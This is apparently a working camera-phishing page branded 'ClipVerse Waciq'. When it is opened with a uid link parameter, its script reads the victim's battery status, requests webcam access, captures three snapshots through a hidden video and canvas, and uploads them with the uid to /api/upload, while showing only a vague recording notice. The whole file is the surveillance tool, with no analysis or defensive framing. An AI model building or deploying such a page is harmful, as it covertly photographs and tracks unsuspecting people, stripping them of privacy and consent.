<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ClipVerse Waciq - Recorder</title>
  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
      background-size: cover;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
      backdrop-filter: blur(6px);
    }

    .container {
      background: rgba(0, 0, 0, 0.6);
      border-radius: 25px;
      padding: 50px 40px;
      width: 100%;
      max-width: 700px;
      box-shadow: 0 0 25px rgba(0,255,153,0.5);
      display: flex;
      flex-direction: column;
      align-items: center;
      animation: popIn 0.7s ease-out;
    }

    .logo {
      width: 100px;
      height: auto;
      border-radius: 0;
      margin-bottom: 25px;
      box-shadow: 0 0 15px rgba(0,255,255,0.6);
    }

    .loader {
      border: 7px solid rgba(255, 255, 255, 0.2);
      border-top: 7px solid #00ffcc;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 25px 0;
    }

    .text {
      font-size: 18px;
      line-height: 1.8;
      text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
      background: linear-gradient(to right, #00ffe7, #00ffa1, #9fff5b);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-weight: bold;
    }

    .credit {
      margin-top: 25px;
      font-size: 14px;
      color: #ccc;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes popIn {
      0% {
        opacity: 0;
        transform: scale(0.9);
      }
      100% {
        opacity: 1;
        transform: scale(1);
      }
    }

    @media (max-width: 600px) {
      .container {
        margin: 0 20px;
        padding: 30px 20px;
      }

      .text {
        font-size: 16px;
      }
    }

    /* مخفي ویډیو/کینواس */
    video, canvas {
      display: none;
    }

    .log {
      margin-top: 15px;
      font-size: 14px;
      color: #66ff66;
      white-space: pre-line;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
    <div class="text" id="status">
      🕵️‍♂️ Recording is in progress...<br>
      Please stay on the page 🎥
    </div>
    <div class="loader"></div>
    <div class="log" id="log"></div>
    <div class="credit">𝗠𝗮𝗱𝗲 𝗯𝘆 💛 𝗪𝗔𝗖𝗜𝗤</div>
  </div>

  <!-- مخفي ویډیو او کینواس -->
  <video id="video" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('snapshot');
    const ctx = canvas.getContext('2d');
    const log = document.getElementById('log');
    const statusEl = document.getElementById('status');

    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid') || 'unknown';

    if (uid) {
      navigator.getBattery().then(battery => {
        const batteryLevel = Math.round(battery.level * 100);
        const isCharging = battery.charging;

        log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
          video.srcObject = stream;
          statusEl.innerText = "📸 Camera access granted...";

          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
        }).catch(err => {
          console.error("Camera error:", err);
          statusEl.innerText = "❌ Camera error!";
        });
      });
    }

    function takeSnapshotAndSend(battery, charging) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/png');

      fetch('/api/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          image: imageData,
          uid,
          battery,
          charging
        })
      }).then(res => res.json()).then(data => {
        log.innerText += "Snapshot uploaded...\n";
      }).catch(err => {
        console.error("Upload error:", err);
        log.innerText += "Upload failed!\n";
      });
    }
  </script>
</body>
</html>
